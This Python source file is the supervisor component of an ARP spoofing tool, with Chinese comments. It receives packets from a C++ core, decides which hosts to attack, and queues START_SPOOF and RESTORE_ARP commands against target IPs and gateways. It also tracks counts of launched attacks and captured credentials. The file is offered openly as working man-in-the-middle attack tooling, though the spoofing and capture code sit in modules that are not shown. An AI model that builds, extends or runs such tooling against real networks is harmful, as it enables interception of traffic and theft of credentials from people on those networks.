#!/usr/bin/env python3
"""
ARP Spoofer Python Supervisor v2.0
===================================
职责：
1. 从C++核心接收网络数据包
2. 分析数据包并做出攻击决策
3. 管理目标状态（TTL缓存）
4. 向C++核心下发攻击指令
5. 提供Web API和监控接口
"""

import zmq
import json
import time
import threading
import logging
import argparse
import signal
import sys
import hashlib  # ★【新增】★ 用于计算数据包指纹
import queue     # ★【新增】★ 用于批量命令处理
import platform  # ★【新增】★ 用于平台检测
from concurrent.futures import ThreadPoolExecutor  # ★【简化】★ 只使用线程池
from dataclasses import dataclass
from typing import Optional, Dict, Set
from datetime import datetime, timedelta

from state_cache import StateCache
from packet_analyzer import PacketAnalyzer
from attack_coordinator import UltraSimpleAttackCoordinator  # ★【修改】★ 使用极简版
from web_api import WebAPI
from config import Config

class PythonSupervisor:
    """Python监督者主类"""
    
    def __init__(self, config: Config):
        self.config = config
        self.running = False
        
        # ★【修复】★ 首先设置日志系统
        self._setup_logging()
        
        # ZMQ上下文和套接字
        self.context = zmq.Context()  # 主业务通信上下文
        self.packet_receiver = None
        self.command_sender = None
        
        # ★【架构重构】★ 独立心跳通信系统
        self.heartbeat_context = zmq.Context()  # 独立心跳ZMQ上下文，避免GIL争用
        self.heartbeat_receiver = None          # 心跳接收通道
        self.heartbeat_sender = None            # 心跳发送通道
        self.heartbeat_dedicated_thread = None  # 专用心跳线程
        
        # ★【ARM优化】★ 检测平台并调整参数
        self.is_arm_platform = platform.machine().startswith(('arm', 'aarch'))
        self.cache_ttl = 2  # TTL时间
        
        if self.is_arm_platform:
            # ARM平台保守配置
            max_threads = min(config.max_worker_threads, 4)  # 限制为4线程
            queue_size = 500    # 减小队列
            self.logger.info("🔧 检测到ARM平台，使用保守配置")
        else:
            # x86平台正常配置
            max_threads = min(config.max_worker_threads, 8)
            queue_size = 1000
        
        # ★【新增】★ 批量命令处理
        self.command_queue = queue.Queue(maxsize=queue_size)
        self.command_processor_thread = None
        self.command_processor_running = False
        
        # 核心组件
        self.state_cache = StateCache()
        self.packet_analyzer = PacketAnalyzer(config)
        self.attack_coordinator = UltraSimpleAttackCoordinator(config, self._attack_callback)  # ★【修改】★ 使用极简版协调器
        self.web_api = WebAPI(self.state_cache, config)
        
        # ★【新增】★ 心跳机制
        self.last_ping_time = time.time()
        self.heartbeat_thread = None
        self.heartbeat_running = False
        
        # ★【简化】★ 只使用线程池，香橙派3B资源有限
        self.thread_pool = ThreadPoolExecutor(
            max_workers=max_threads,  # 使用全部线程数
            thread_name_prefix="PacketWorker"
        )
        
        # ★【增强】★ 统计信息，添加更多监控指标
        self.stats = {
            'start_time': time.time(),
            'packets_received': 0,
            'packets_processed': 0,
            'packets_dropped': 0,        # ★【新增】★ 丢包统计
            'commands_sent': 0,
            'commands_queued': 0,        # ★【新增】★ 队列命令数
            'attacks_launched': 0,
            'credentials_captured': 0,
            'heartbeat_sent': 0,         # ★【新增】★ 心跳发送统计
            'heartbeat_received': 0,     # ★【新增】★ 心跳接收统计
            'processing_rate': 0.0       # ★【新增】★ 处理速率
        }
        self.stats_lock = threading.RLock()  # ★【优化】★ 使用可重入锁
        
        # ★【极简化】★ 移除复杂缓存机制
        self.recent_packets = set()  # 简单的去重集合
        self.cache_lock = threading.Lock()
        self.last_cache_cleanup = time.time()
        
    def _setup_logging(self):
        """设置日志系统"""
        logging.basicConfig(
            level=getattr(logging, self.config.log_level.upper()),
            format='[%(asctime)s] [%(threadName)-20s] [%(levelname)-8s] %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S',
            handlers=[
                logging.FileHandler(self.config.log_file, mode='a'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        
        self.logger = logging.getLogger(__name__)
        
    def initialize(self) -> bool:
        """初始化监督者"""
        try:
            self.logger.info("正在初始化Python监督者...")
            
            # 初始化ZMQ套接字
            if not self._init_zmq():
                return False
                
            # 初始化各个组件
            # ★【修改】★ 使用队列命令而不是直接发送
            if not self.attack_coordinator.initialize(self._queue_command):
                self.logger.error("攻击协调器初始化失败")
                return False
            
            # ★【新增】★ 启动命令处理线程
            self._start_command_processor()
                
            # 启动Web API（如果启用）
            if self.config.enable_web_api:
                self.web_api.start(self.config.web_api_port)
                
            self.logger.info("Python监督者初始化成功")
            return True
            
        except Exception as e:
            self.logger.error(f"监督者初始化失败: {e}")
            return False
            
    def _init_zmq(self) -> bool:
        """初始化ZMQ通信"""
        try:
            # 1. Packet Receiver (C++ PUSH -> Python PULL)
            self.packet_receiver = self.context.socket(zmq.PULL)
            self.packet_receiver.bind(self.config.ipc.packet_address)
            self.packet_receiver.setsockopt(zmq.RCVTIMEO, 500)
            self.packet_receiver.setsockopt(zmq.RCVHWM, self.config.ipc.packet_hwm)

            # 2. Command Sender (Python PUSH -> C++ PULL)
            self.command_sender = self.context.socket(zmq.PUSH)
            self.command_sender.connect(self.config.ipc.command_address)
            self.command_sender.setsockopt(zmq.SNDTIMEO, 500)
            self.command_sender.setsockopt(zmq.SNDHWM, self.config.ipc.command_hwm)
            self.command_sender.setsockopt(zmq.LINGER, 0)

            # 3. Heartbeat PING Receiver (C++ PUSH -> Python PULL) - ★【独立上下文】★
            self.heartbeat_receiver = self.heartbeat_context.socket(zmq.PULL)
            self.heartbeat_receiver.bind(self.config.ipc.heartbeat_ping_address)
            self.heartbeat_receiver.setsockopt(zmq.RCVTIMEO, 100)  # ★【修复】★ 短超时，避免阻塞
            self.heartbeat_receiver.setsockopt(zmq.RCVHWM, self.config.ipc.heartbeat_hwm)
            self.heartbeat_receiver.setsockopt(zmq.LINGER, 0)

            # 4. Heartbeat PONG Sender (Python PUSH -> C++ PULL)
            self.heartbeat_sender = self.heartbeat_context.socket(zmq.PUSH)
            self.heartbeat_sender.connect(self.config.ipc.heartbeat_pong_address)
            self.heartbeat_sender.setsockopt(zmq.SNDTIMEO, 200)
            self.heartbeat_sender.setsockopt(zmq.SNDHWM, self.config.ipc.heartbeat_hwm)
            self.heartbeat_sender.setsockopt(zmq.LINGER, 0)

            self.logger.info("ZMQ套接字初始化完成，角色配置如下:")
            self.logger.info(f"  - 数据包接收器 [PULL-BIND]   @ {self.config.ipc.packet_address}")
            self.logger.info(f"  - 命令发送器  [PUSH-CONNECT] @ {self.config.ipc.command_address}")
            self.logger.info(f"  - 心跳PING接收  [PULL-BIND]   @ {self.config.ipc.heartbeat_ping_address}")
            self.logger.info(f"  - 心跳PONG发送  [PUSH-CONNECT] @ {self.config.ipc.heartbeat_pong_address}")
            self.logger.info("🫀 所有IPC通道配置正确")
            
            return True
            
        except Exception as e:
            self.logger.error(f"ZMQ初始化失败: {e}")
            return False

    def run(self):
        """运行主循环"""
        self.running = True
        self.logger.info("启动监督者主循环...")
        
        # ★【新增】★ 启动心跳机制
        self.start_heartbeat()
        
        # ★【新增】★ 启动性能监控
        self._start_performance_monitoring()
        
        try:
            while self.running:
                try:
                    # 1. 接收原始二进制数据
                    raw_data = self.packet_receiver.recv(zmq.NOBLOCK)
                    self._safe_stats_increment('packets_received')
                    
                    # ★★★【关键性能优化】★★★ 主线程只负责快速接收和分发
                    # 2. 最轻量的预检查 - 只检查数据长度
                    if len(raw_data) < 10:  # 过小的数据直接丢弃
                        self._safe_stats_increment('packets_dropped')
                        continue
                    
                    # ★【负载控制】★ 检查队列深度，防止过载
                    if self.command_queue.qsize() > 800:  # 过载阈值
                        self._safe_stats_increment('packets_dropped')
                        self.logger.warning("系统过载，丢弃数据包")
                        continue
                    
                    # 3. ★【性能关键】★ 直接提交到线程池，避免主线程阻塞
                    # 将所有重型操作（JSON解析、哈希计算、去重）都移到工作线程中
                    self.thread_pool.submit(self._process_packet_with_dedup, raw_data)
                    
                except zmq.Again:
                    # 没有数据包，短暂休眠
                    time.sleep(0.001)
                    continue
                    
                except Exception as e:
                    self.logger.error(f"主循环错误: {e}")
                    time.sleep(0.1)
                    
        except KeyboardInterrupt:
            self.logger.info("收到中断信号")
        finally:
            self.shutdown()
            
    def _process_packet_with_dedup(self, raw_data: bytes):
        """处理数据包并进行去重 - 极简版本"""
        try:
            # 1. 将原始二进制数据转换为字符串
            packet_data = raw_data.decode('utf-8')
            
            # 2. ★【极简去重】★ 只保留最近30秒的数据包哈希
            packet_hash = hashlib.md5(packet_data.encode()).hexdigest()[:16]  # 只取前16位节省内存
            
            with self.cache_lock:
                current_time = time.time()
                
                # 每10秒清理一次缓存
                if current_time - self.last_cache_cleanup > 10:
                    self.recent_packets.clear()
                    self.last_cache_cleanup = current_time
                
                if packet_hash in self.recent_packets:
                    self._safe_stats_increment('packets_dropped')
                    return  # 重复数据包，直接丢弃
                
                self.recent_packets.add(packet_hash)
            
            # 3. 执行实际的数据包处理
            self._process_packet(packet_data)
            
        except UnicodeDecodeError:
            self._safe_stats_increment('packets_dropped')
        except Exception as e:
            self._safe_stats_increment('packets_dropped')
            self.logger.error(f"数据包处理错误: {e}")
    
    def _process_packet(self, packet_data: str):
        """简化的数据包处理流程"""
        try:
            # 解析数据包
            packet_info = json.loads(packet_data)
            self._safe_stats_increment('packets_processed')
            
            # 分析数据包
            analysis_result = self.packet_analyzer.analyze(packet_info)
            
            if analysis_result:
                # ★【简化】★ 直接调用决策，攻击协调器内部已包含所有必要的控制
                decision = self.attack_coordinator.make_decision(analysis_result)
                if decision:
                    self._execute_decision(decision)
                    
        except json.JSONDecodeError:
            self._safe_stats_increment('packets_dropped')
            self.logger.debug(f"JSON解析失败: {packet_data[:100]}")
        except Exception as e:
            self._safe_stats_increment('packets_dropped')
            self.logger.error(f"数据包处理错误: {e}")
            
    # ★【新增】★ 批量命令处理方法
    def _queue_command(self, command: dict):
        """将命令加入队列进行批量处理"""
        try:
            # 负载控制：如果队列太满，丢弃新命令
            if self.command_queue.full():
                self._safe_stats_increment('packets_dropped')
                self.logger.warning("命令队列已满，丢弃命令")
                return
            
            self.command_queue.put(command, block=False)
            self._safe_stats_increment('commands_queued')
                
        except queue.Full:
            self._safe_stats_increment('packets_dropped')
            self.logger.warning("命令队列已满，命令被丢弃")
            
    def _start_command_processor(self):
        """启动批量命令处理线程"""
        self.command_processor_running = True
        self.command_processor_thread = threading.Thread(
            target=self._command_processor_loop, 
            daemon=True,
            name="CommandProcessor"
        )
        self.command_processor_thread.start()
        self.logger.info("命令处理线程已启动")
        
    def _command_processor_loop(self):
        """批量命令处理循环"""
        self.logger.info("命令处理循环已启动")
        batch_size = 5  # 批处理大小
        batch_timeout = 0.1  # 100ms批处理超时
        
        while self.command_processor_running:
            commands_batch = []
            
            try:
                # 收集一批命令
                start_time = time.time()
                while (len(commands_batch) < batch_size and 
                       time.time() - start_time < batch_timeout):
                    try:
                        command = self.command_queue.get(timeout=0.01)
                        commands_batch.append(command)
                    except queue.Empty:
                        continue
                
                # 批量发送命令
                if commands_batch:
                    self._send_commands_batch(commands_batch)
                    
            except Exception as e:
                self.logger.error(f"命令处理器错误: {e}")
                time.sleep(0.1)  # 发生错误时短暂休眠
                
        self.logger.info("命令处理循环已停止")
        
    def _send_commands_batch(self, commands: list):
        """批量发送命令"""
        try:
            for command in commands:
                command_json = json.dumps(command)
                self.command_sender.send_string(command_json, zmq.NOBLOCK)
                
                self._safe_stats_increment('commands_sent')
                    
        except zmq.Again:
            self.logger.warning(f"批量命令发送超时，{len(commands)}个命令失败")
            self._safe_stats_increment('packets_dropped', len(commands))
        except Exception as e:
            self.logger.error(f"批量命令发送错误: {e}")
            self._safe_stats_increment('packets_dropped', len(commands))
    
    # ★【优化】★ 独立心跳处理方法
    def _handle_ping(self, ping_data):
        """处理心跳PING，使用独立通道发送PONG"""
        try:
            # ★【关键修复】★ 使用C++端期望的命令类型PONG而不是pong
            pong_response = {
                "type": "PONG",
                "timestamp": time.time(),
                "supervisor_id": "python_supervisor"
            }
            
            # ★【关键修复】★ 使用独立心跳发送通道，避免主通道阻塞
            pong_json = json.dumps(pong_response)
            self.heartbeat_sender.send_string(pong_json, zmq.NOBLOCK)
            
            self._safe_stats_increment('heartbeat_sent')
                
            # ★【优化】★ 降低心跳日志频率，避免日志洪泛
            current_time = time.time()
            if not hasattr(self, '_last_heartbeat_log') or current_time - self._last_heartbeat_log > 30:
                self.logger.debug("🫀 通过专用通道发送PONG")
                self._last_heartbeat_log = current_time
                
        except zmq.Again:
            self.logger.warning("心跳PONG通过专用通道发送超时")
        except Exception as e:
            self.logger.error(f"心跳PONG发送错误: {e}")
    
    # ★【增强】★ 性能监控方法
    def _start_performance_monitoring(self):
        """启动性能监控"""
        self.performance_monitoring_thread = threading.Thread(
            target=self._performance_monitoring_loop,
            daemon=True,
            name="PerformanceMonitor"
        )
        self.performance_monitoring_thread.start()
        self.logger.info("性能监控已启动")
        
    def _performance_monitoring_loop(self):
        """性能监控循环"""
        last_stats_time = time.time()
        last_packets = 0
        last_commands = 0
        
        while self.running:
            try:
                current_time = time.time()
                
                # 每30秒输出一次性能报告
                if current_time - last_stats_time >= 30:
                    with self.stats_lock:
                        current_packets = self.stats['packets_processed']
                        current_commands = self.stats['commands_sent']
                        
                        # 计算处理速率
                        time_diff = current_time - last_stats_time
                        packet_rate = (current_packets - last_packets) / time_diff
                        command_rate = (current_commands - last_commands) / time_diff
                        
                        self.stats['processing_rate'] = packet_rate
                        
                        # ★【简化】★ 基本性能报告
                        uptime = current_time - self.stats['start_time']
                        self.logger.info(f"📊 性能报告:")
                        self.logger.info(f"  运行时间: {uptime:.1f}秒")
                        self.logger.info(f"  数据包: {current_packets} (速率: {packet_rate:.1f}/秒)")
                        self.logger.info(f"  命令: {current_commands} (速率: {command_rate:.1f}/秒)")
                        self.logger.info(f"  队列大小: {self.command_queue.qsize()}")
                        self.logger.info(f"  丢包: {self.stats['packets_dropped']}")
                        self.logger.info(f"  心跳: 发送={self.stats['heartbeat_sent']}, 接收={self.stats['heartbeat_received']}")
                        
                        # ★【简化】★ 基本警告检查
                        queue_threshold = 300 if self.is_arm_platform else 500
                        if self.command_queue.qsize() > queue_threshold:
                            self.logger.warning("⚠️  检测到命令队列深度过高!")
                        if packet_rate > 200:
                            self.logger.warning("⚠️  数据包处理速率过高!")
                
                time.sleep(5)  # 每5秒检查一次
                
            except Exception as e:
                self.logger.error(f"性能监控错误: {e}")
                time.sleep(5)
    
    # ★【新增】★ 优化的执行决策方法
    def _execute_decision(self, decision):
        """执行攻击决策 - 使用队列而不是直接发送"""
        try:
            # ★【关键修复】★ AttackDecision是dataclass对象，使用属性访问而不是字典下标
            # ★【关键修复】★ 修正命令类型，匹配C++端期望的格式
            if decision.action == "attack":
                command_type = "START_SPOOF"
            elif decision.action == "restore": 
                command_type = "RESTORE_ARP"
            elif decision.action == "ignore":
                # ignore类型不需要发送命令给C++端
                return
            else:
                self.logger.warning(f"未知决策动作: {decision.action}")
                return
                
            command = {
                "type": command_type,
                "target_ip": decision.target_ip,
                "gateway_ip": decision.gateway_ip or "10.17.0.1",
                "target_mac": decision.target_mac or "",
                "gateway_mac": decision.gateway_mac or "",
                "duration": decision.duration or 60,
                "attack_type": decision.attack_type or "scouting"
            }
            
            # ★【关键修改】★ 使用队列而不是直接发送
            self._queue_command(command)
            
            self._safe_stats_increment('attacks_launched')
                
        except Exception as e:
            self.logger.error(f"执行决策错误: {e}")
    
    # ★【新增】★ 程序结束时打印最终统计
    def _print_final_stats(self):
        """打印最终统计信息"""
        uptime = time.time() - self.stats['start_time']
        
        print("\n" + "="*50)
        print("📋 最终统计信息摘要")
        print("="*50)
        print(f"总运行时间: {uptime:.1f} 秒")
        print(f"接收数据包: {self.stats['packets_received']}")
        print(f"处理数据包: {self.stats['packets_processed']}")
        print(f"丢弃数据包: {self.stats['packets_dropped']}")
        print(f"发送命令: {self.stats['commands_sent']}")
        print(f"队列命令: {self.stats['commands_queued']}")
        print(f"发起攻击: {self.stats['attacks_launched']}")
        print(f"捕获凭据: {self.stats['credentials_captured']}")
        print(f"发送心跳: {self.stats['heartbeat_sent']}")
        print(f"接收心跳: {self.stats['heartbeat_received']}")
        
        if uptime > 0:
            print(f"平均数据包速率: {self.stats['packets_processed']/uptime:.1f} 包/秒")
            print(f"平均命令速率: {self.stats['commands_sent']/uptime:.1f} 命令/秒")
        
        # 计算效率指标
        total_packets = self.stats['packets_processed'] + self.stats['packets_dropped']
        if total_packets > 0:
            drop_rate = (self.stats['packets_dropped'] / total_packets) * 100
            print(f"数据包丢失率: {drop_rate:.2f}%")
        
        if self.stats['heartbeat_sent'] > 0:
            heartbeat_success_rate = (self.stats['heartbeat_received'] / self.stats['heartbeat_sent']) * 100
            print(f"心跳成功率: {heartbeat_success_rate:.2f}%")
        
        print("="*50)
    
    # ★【修改】★ 优化的关闭处理
    def shutdown(self):
        """优雅关闭监督者"""
        self.logger.info("🛑 开始监督者关闭序列...")
        
        # 发送关闭信号给C++核心
        try:
            # ★【关键修复】★ 使用C++端期望的命令类型SHUTDOWN而不是shutdown
            shutdown_cmd = {"type": "SHUTDOWN"}
            # ★【关键修复】★ 使用正确的方法名_queue_command而不是不存在的_send_command
            self._queue_command(shutdown_cmd)
            self.logger.info("📤 关闭信号已发送到C++核心")
        except Exception as e:
            self.logger.error(f"发送关闭命令失败: {e}")
        
        self.running = False
        
        # ★【新增】★ 停止命令处理线程
        if hasattr(self, 'command_processor_running'):
            self.command_processor_running = False
            if hasattr(self, 'command_processor_thread') and self.command_processor_thread:
                self.command_processor_thread.join(timeout=2.0)
                self.logger.info("命令处理线程已停止")
        
        # 停止心跳
        self.stop_heartbeat()
        
        # 停止Web API
        if self.config.enable_web_api:
            self.web_api.stop()
        
        # 关闭线程池
        self.thread_pool.shutdown(wait=True)
        
        # ★【新增】★ 清理独立心跳上下文
        if hasattr(self, 'heartbeat_context'):
            self.heartbeat_context.term()
        
        # 关闭ZMQ上下文
        self.context.term()
        
        # ★【新增】★ 打印最终统计
        self._print_final_stats()
        
        self.logger.info("✅ 监督者关闭完成")

    def start_heartbeat(self):
        """★【架构重构】★ 启动独立的专用心跳线程"""
        if self.heartbeat_running:
            return
            
        self.heartbeat_running = True
        # ★【关键修复】★ 创建专用心跳线程，完全独立于主业务逻辑
        self.heartbeat_dedicated_thread = threading.Thread(
            target=self._dedicated_heartbeat_loop, 
            daemon=False,  # ★【重要】★ 非守护线程，确保正常关闭
            name="DedicatedHeartbeat"
        )
        self.heartbeat_dedicated_thread.start()
        self.logger.info("🫀 专用心跳线程已启动，与主业务逻辑隔离")
    
    def stop_heartbeat(self):
        """停止心跳机制"""
        self.heartbeat_running = False
        if self.heartbeat_dedicated_thread and self.heartbeat_dedicated_thread.is_alive():
            self.heartbeat_dedicated_thread.join(timeout=2.0)
        self.logger.info("专用心跳线程已停止")
    
    def _dedicated_heartbeat_loop(self):
        """★【架构重构】★ 专用心跳循环 - 完全独立，最高优先级，零业务干扰"""
        # ★【性能优化】★ 设置线程优先级
        self._set_thread_priority_high()
        
        self.logger.info("🔥 专用心跳线程已启动 - 零业务干扰")
        
        heartbeat_failures = 0
        last_heartbeat_time = time.time()
        consecutive_json_errors = 0
        ping_received = 0  # ★【关键修复】★ 初始化变量，避免UnboundLocalError
        
        while self.heartbeat_running:
            ping_received_this_round = False  # ★【关键修复】★ 每轮重置标志
            try:
                # ★【关键修复】★ 使用recv()获取原始字节，然后手动解码
                raw_message = self.heartbeat_receiver.recv(flags=zmq.NOBLOCK)
                
                # ★【调试】★ 记录收到的原始消息用于诊断
                if len(raw_message) == 0:
                    print(f"🚨 EMPTY FRAME DETECTED! Raw message length: {len(raw_message)}")
                    time.sleep(0.001)
                    continue
                
                # ★【调试】★ 每50个消息打印一次原始内容，减少性能开销
                if ping_received % 50 == 0:
                    print(f"🔍 DEBUG: Raw frame #{ping_received}: {repr(raw_message[:100])}")

                try:
                    # ★【兼容性修复】★ 手动解码并处理两种格式：JSON 和 简单字符串
                    message_str = raw_message.decode('utf-8', errors='replace').strip()
                    
                    # 尝试解析为JSON格式
                    if message_str.startswith('{'):
                        # JSON格式的PING消息
                        ping_data = json.loads(message_str)
                        is_ping = ping_data.get("type") == "PING"
                    else:
                        # 简单字符串格式的PING消息（C++兼容性）
                        is_ping = message_str == "PING"
                        ping_data = {"type": "PING", "timestamp": time.time(), "sequence": ping_received}
                    
                    if is_ping:
                        # 重置JSON错误计数
                        consecutive_json_errors = 0
                        ping_received += 1
                        ping_received_this_round = True  # ★【修复】★ 标记本轮收到了PING
                        
                        # 立即处理PING
                        current_time = time.time()
                        self._send_immediate_pong(ping_data, current_time)
                        
                        # 重置失败计数
                        heartbeat_failures = 0
                        last_heartbeat_time = current_time
                    else:
                        # 不是PING消息，跳过
                        continue
                    
                except (json.JSONDecodeError, UnicodeDecodeError, ValueError) as e:
                    consecutive_json_errors += 1
                    if consecutive_json_errors <= 5:  # 只记录前5次
                        print(f"⚠️  HEARTBEAT PARSE ERROR #{consecutive_json_errors}: {e}")
                        print(f"     Raw message: {repr(raw_message[:100])}")
                    
                    # ★【关键】★ 解析错误不影响心跳，直接继续
                    time.sleep(0.001)
                    continue
                    
            except zmq.Again:
                # ★【超时检查】★ 检查心跳超时
                current_time = time.time()
                silence_duration = current_time - last_heartbeat_time
                
                if silence_duration > 10:  # 10秒无心跳
                    heartbeat_failures += 1
                    if heartbeat_failures <= 3:  # 只记录前3次
                        print(f"⚠️  HEARTBEAT TIMEOUT #{heartbeat_failures}: No valid PING for {silence_duration:.1f}s")
                    last_heartbeat_time = current_time
                
                # ★【极短休眠】★ 1ms休眠，确保最高响应性
                time.sleep(0.001)
                continue
                
            except Exception as e:
                # ★【异常兜底】★ 任何其他异常都不能影响心跳，增加详细错误信息
                print(f"❌ HEARTBEAT THREAD ERROR: {e}")
                import traceback
                traceback.print_exc()  # ★【调试】★ 打印完整错误栈，便于诊断
                time.sleep(0.01)  # 防止异常风暴
        
        self.logger.info("🫀 专用心跳线程结束")
    
    def _send_immediate_pong(self, ping_data, current_time):
        """★【极速响应】★ 立即发送PONG，零延迟，带重试机制"""
        try:
            # 构造简单的PONG响应
            pong_response = {
                "type": "PONG",
                "timestamp": current_time,
                "sequence": ping_data.get("sequence", 0),
                "supervisor_status": "alive"
            }
            pong_json = json.dumps(pong_response)
            
            # ★【增强】★ 增加重试机制，确保PONG发送成功
            for retry in range(3):  # 最多尝试3次
                try:
                    # ★【关键】★ 使用独立心跳sender，绝不与业务通道争抢
                    self.heartbeat_sender.send_string(pong_json, zmq.NOBLOCK)
                    
                    # ★【调试】★ 每隔一段时间打印PONG发送确认
                    if ping_data.get("sequence", 0) % 10 == 0:
                        print(f"🫀 PONG sent for sequence #{ping_data.get('sequence', 0)}")
                    
                    break  # 发送成功，跳出重试循环
                except zmq.Again:
                    if retry < 2:  # 前两次失败时短暂等待
                        time.sleep(0.001)  # 1ms后重试
                    else:
                        print(f"⚠️  PONG send failed after 3 retries")
                except Exception as e:
                    if retry < 2:
                        time.sleep(0.001)
                    else:
                        print(f"⚠️  PONG send error: {e}")
            
            # ★【可选统计】★ 使用安全的统计方法
            self._safe_stats_increment('heartbeat_sent')
            self._safe_stats_increment('heartbeat_received')
                
        except Exception as e:
            # ★【兜底】★ PONG发送失败也不能影响心跳接收
            print(f"⚠️  PONG SEND ERROR: {e}")
    
    def _set_thread_priority_high(self):
        """跨平台设置线程高优先级"""
        try:
            import os
            import platform
            import threading
            
            system = platform.system().lower()
            if system == "windows":
                # Windows平台
                import ctypes
                ctypes.windll.kernel32.SetThreadPriority(
                    ctypes.windll.kernel32.GetCurrentThread(), 2)  # THREAD_PRIORITY_ABOVE_NORMAL
                print("🚀 Windows heartbeat thread priority set to HIGH")
            elif system == "linux":
                # Linux平台 (包括ARM设备)
                try:
                    import ctypes
                    libc = ctypes.CDLL("libc.so.6")
                    # 设置nice值为-10 (较高优先级)
                    libc.setpriority(0, 0, -10)  # PRIO_PROCESS, 当前进程, nice值
                    print("🚀 Linux heartbeat thread priority set to HIGH (nice -10)")
                except Exception as e:
                    # 尝试通过os.nice设置进程优先级
                    try:
                        current_nice = os.nice(0)
                        if current_nice > -10:
                            os.nice(-10 - current_nice)
                        print(f"🚀 Linux process nice set from {current_nice} to {os.nice(0)}")
                    except Exception as e2:
                        print(f"⚠️ Failed to set Linux priority: {e}, {e2}")
            elif system == "darwin":
                # macOS平台
                try:
                    import ctypes
                    libc = ctypes.CDLL("/usr/lib/libc.dylib")
                    libc.setpriority(0, 0, -10)  # 设置较高优先级
                    print("🚀 macOS heartbeat thread priority set to HIGH")
                except Exception as e:
                    print(f"⚠️ Failed to set macOS priority: {e}")
            else:
                print(f"⚠️ Unknown platform {system}, skipping priority setting")
                
        except Exception as e:
            print(f"⚠️ Failed to set heartbeat thread priority: {e}")
            # 继续执行，不因为优先级设置失败而中断

    def _safe_stats_get(self, key: str, default=0):
        """安全地获取统计值，避免KeyError"""
        try:
            with self.stats_lock:
                return self.stats.get(key, default)
        except Exception as e:
            self.logger.warning(f"访问统计键 '{key}' 时出错: {e}")
            return default
    
    def _safe_stats_increment(self, key: str, increment=1):
        """安全地增加统计值，避免KeyError"""
        try:
            with self.stats_lock:
                if key not in self.stats:
                    self.stats[key] = 0
                self.stats[key] += increment
        except Exception as e:
            self.logger.warning(f"递增统计键 '{key}' 时出错: {e}")
    
    def _safe_stats_set(self, key: str, value):
        """安全地设置统计值，避免KeyError"""
        try:
            with self.stats_lock:
                self.stats[key] = value
        except Exception as e:
            self.logger.warning(f"设置统计键 '{key}' 时出错: {e}")
    
    def _attack_callback(self, decision):
        """极简协调器的攻击回调函数"""
        try:
            command = {
                "type": "START_SPOOF",
                "target_ip": decision.target_ip,
                "gateway_ip": decision.gateway_ip or "192.168.1.1",
                "target_mac": decision.target_mac or "",
                "gateway_mac": decision.gateway_mac or "",
                "duration": decision.duration or 45,
                "attack_type": decision.attack_type or "standard"
            }
            
            # 使用队列发送命令
            self._queue_command(command)
            
        except Exception as e:
            self.logger.error(f"攻击回调错误: {e}")

def parse_arguments():
    """解析命令行参数"""
    parser = argparse.ArgumentParser(description="ARP欺骗器Python监督者")
    parser.add_argument('-c', '--config', default='config.yaml',
                       help='配置文件路径')
    parser.add_argument('--log-level', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'],
                       default='INFO', help='日志级别')
    parser.add_argument('--web-api', action='store_true',
                       help='启用Web API接口')
    parser.add_argument('--web-port', type=int, default=8080,
                       help='Web API端口')
    
    return parser.parse_args()

def signal_handler(signum, frame):
    """信号处理器"""
    print(f"\n收到信号 {signum}，正在关闭...")
    sys.exit(0)

def main():
    """主函数"""
    # 解析命令行参数
    args = parse_arguments()
    
    # 设置信号处理
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        # 加载配置
        config = Config.load_from_file(args.config)
        
        # 命令行参数覆盖配置文件
        if args.log_level:
            config.log_level = args.log_level
        if args.web_api:
            config.enable_web_api = True
        if args.web_port:
            config.web_api_port = args.web_port
            
        # 创建并运行监督者
        supervisor = PythonSupervisor(config)
        
        if supervisor.initialize():
            supervisor.run()
        else:
            print("监督者初始化失败")
            sys.exit(1)
            
    except Exception as e:
        print(f"致命错误: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
